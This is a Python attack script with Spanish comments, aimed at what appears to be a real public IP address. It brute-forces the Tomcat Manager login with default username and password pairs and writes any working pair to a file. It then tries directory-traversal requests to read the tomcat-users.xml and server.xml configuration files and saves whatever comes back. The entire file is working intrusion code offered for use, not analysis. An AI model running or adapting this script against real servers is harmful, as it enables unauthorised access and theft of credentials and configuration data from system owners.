#!/usr/bin/env python3
import requests
import base64

target_8080 = "http://189.254.143.102:8080"

# Credenciales comunes para Tomcat Manager
credentials = [
    ("tomcat", "tomcat"),
    ("admin", "admin"),
    ("admin", "password"),
    ("both", "manager"),
    ("role1", "role1"),
    ("root", "root"),
    ("admin", ""),
    ("", "manager")
]

print("[+] Probando credenciales en Tomcat Manager (puerto 8080)...")
for user, pwd in credentials:
    auth_str = base64.b64encode(f"{user}:{pwd}".encode()).decode()
    headers = {"Authorization": f"Basic {auth_str}"}
    
    try:
        response = requests.get(f"{target_8080}/manager/html", headers=headers, timeout=10)
        print(f"[+] {user}:{pwd} - Status: {response.status_code}")
        
        if response.status_code == 200 and "Tomcat" in response.text:
            print(f"    [¡CREDENCIALES VÁLIDAS!] {user}:{pwd}")
            with open("tomcat_credentials.txt", "w") as f:
                f.write(f"{user}:{pwd}")
            break
    except Exception as e:
        print(f"    Error: {e}")

# Probar Directory Traversal en puerto 8080
print("\n[+] Probando Directory Traversal en puerto 8080...")
paths = [
    "/examples/jsp/include/include.jsp?page=../../../../conf/tomcat-users.xml",
    "/examples/jsp/include/include.jsp?page=../../../../conf/server.xml",
    "/examples/servlets/servlet/SnoopServlet"
]

for path in paths:
    try:
        response = requests.get(f"{target_8080}{path}", timeout=10)
        print(f"[+] {path}")
        print(f"    Status: {response.status_code}")
        print(f"    Tamaño: {len(response.text)}")
        
        if "tomcat-users" in response.text or "server" in response.text.lower():
            print("    [POSIBLE ÉXITO] Archivo de configuración encontrado!")
            filename = f"success_8080_{path.split('/')[-1].split('?')[0]}.txt"
            with open(filename, "w") as f:
                f.write(response.text)
    except Exception as e:
        print(f"    Error: {e}")